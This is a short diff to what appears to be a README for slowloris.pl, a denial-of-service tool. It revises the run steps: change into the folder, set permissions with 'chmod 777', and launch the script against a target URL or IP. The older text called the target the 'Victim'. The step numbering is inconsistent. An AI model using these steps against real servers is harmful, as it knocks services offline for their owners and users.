@@ -9,9 +9,10 @@ Requirements:
 
 1)Download slowloris.pl
 2)Open Terminal
-2)# cd /thePathToYourSlowloris.plFile
-3)# ./slowloris.pl
-4)# perl slowloris.pl -dns (Victim URL or IP) -options
+2)# cd /slowloris
+4)# chmod 777 ./slowloris.pl
+5)# ./slowloris.pl
+6)# perl slowloris.pl -dns (URL or IP) -options
 
 
 
